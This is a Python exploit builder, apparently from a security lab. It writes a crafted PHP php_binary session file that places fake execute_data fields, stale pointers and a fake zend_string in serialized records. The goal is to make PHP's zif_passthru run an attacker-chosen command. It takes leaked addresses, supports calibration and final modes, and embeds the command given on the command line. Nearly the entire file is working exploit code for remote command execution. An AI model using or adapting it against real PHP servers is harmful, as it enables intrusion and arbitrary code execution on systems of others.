#!/usr/bin/env python3
"""Build a php_binary session file for the per-version zif_passthru decode test.

Record 1 key (96 bytes) carries the fake execute_data fields; the int value is
the decode target.  Record 2's string payload carries the fake stale P/B0 and
the fake zend_string F for the command.
"""
import argparse, json, os, struct

LAB = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
L1 = 96
F_PAYLOAD_OFF = 0x100
CMD_LEN_OFF = F_PAYLOAD_OFF + 0x10
CMD_OFF = F_PAYLOAD_OFF + 0x18


def build(path, X1, P, B0, total, mode, x2=0, cmd=b'', target=0, a_target=0, verbose=True):
    val = ('i:%d;' % target).encode()
    key1 = bytearray(b'A' * L1)
    key1[0x2c - 1:0x2f] = struct.pack('<I', 1)          # EX_NUM_ARGS = 1
    key1[0x50 - 1:0x50 + 7] = b'\x00' * 8               # arg1 ptr set after Q is known
    key1[0x58 - 1] = 6                                   # arg1 IS_STRING
    rec1 = bytes([L1]) + bytes(key1) + val
    R = len(rec1)
    L = total - R - 2
    for _ in range(8):
        prefix2 = b'\x01z' + b's:' + str(L).encode() + b':"'
        nl = total - R - len(prefix2) - 2
        if nl == L:
            break
        L = nl
    prefix2 = b'\x01z' + b's:' + str(L).encode() + b':"'
    Q = R + len(prefix2)
    if x2:
        key1[0x50 - 1:0x50 + 7] = struct.pack('<Q', x2 + 0x18 + Q + F_PAYLOAD_OFF)
        rec1 = bytes([L1]) + bytes(key1) + val
        assert len(rec1) == R
    payload = bytearray(L)
    # Q is not fixed: the decimal width of the target changes rec1 length.
    # The fake execute_data fields live in key1 (file offsets 0x2c/0x50/0x58),
    # so only the payload-relative placement of P/B0/F uses Q.
    assert 0x58 < 1 + L1, 'key1 too short for fake execute_data fields'
    p_off = P - (X1 + 24)
    b_off = B0 - (X1 + 24)
    p_idx = p_off - Q
    b_idx = b_off - Q
    assert 0 <= p_idx and p_idx + 72 <= L, 'fake P outside payload'
    assert 0 <= b_idx and b_idx + 16 <= L, 'fake B0 outside payload'
    K = 0 if mode == 'calib' else (a_target - (B0 + 16)) // 16
    if mode != 'calib':
        assert (a_target - (B0 + 16)) % 16 == 0, (hex(a_target), hex(B0))
    f = struct.pack('<QQQQQQQQ', P + 56, B0, B0, 0, 0, 0, 0x7fffffff, 1018)
    payload[p_idx:p_idx + len(f)] = f
    payload[p_idx + 64:p_idx + 72] = struct.pack('<Q', 0)
    payload[b_idx:b_idx + 8] = struct.pack('<q', K)
    payload[b_idx + 8:b_idx + 16] = struct.pack('<Q', 0)
    payload[CMD_LEN_OFF:CMD_LEN_OFF + 8] = struct.pack('<Q', len(cmd))
    payload[CMD_OFF:CMD_OFF + len(cmd)] = cmd
    payload[CMD_OFF + len(cmd)] = 0
    assert CMD_OFF + len(cmd) + 1 < L
    data = rec1 + prefix2 + bytes(payload) + b'";'
    assert len(data) == total, (len(data), total)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb') as fp:
        fp.write(data)
    meta = {'path': path, 'mode': mode, 'total': total, 'rec1_len': R, 'L': L,
            'payload_start': Q, 'X1': hex(X1), 'X2': hex(x2) if x2 else None,
            'P': hex(P), 'B0': hex(B0), 'p_off': p_off, 'b_off': b_off,
            'p_idx': p_idx, 'b_idx': b_idx, 'K': K,
            'A_target': hex(a_target), 'value': val.decode(),
            'F': hex(x2 + 0x18 + Q + F_PAYLOAD_OFF) if x2 else None,
            'F_off': Q + F_PAYLOAD_OFF, 'cmd_len_off': Q + CMD_LEN_OFF,
            'cmd_off': Q + CMD_OFF, 'cmd': cmd.decode('latin1')}
    if verbose:
        print(json.dumps(meta, indent=1))
    return meta


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--out', required=True)
    ap.add_argument('--x1', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--x2', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--p', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--b0', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--total', type=int, default=131014)
    ap.add_argument('--mode', choices=['calib', 'final'], default='calib')
    ap.add_argument('--cmd', required=True)
    ap.add_argument('--target', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--a-target', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--meta', default=None)
    a = ap.parse_args()
    if a.mode == 'final':
        assert a.x2, 'final mode needs --x2'
    meta = build(a.out, a.x1, a.p, a.b0, a.total, a.mode, a.x2,
                 a.cmd.encode(), a.target, a.a_target, verbose=True)
    if a.meta:
        with open(a.meta, 'w') as fp:
            json.dump(meta, fp, indent=1)


if __name__ == '__main__':
    main()
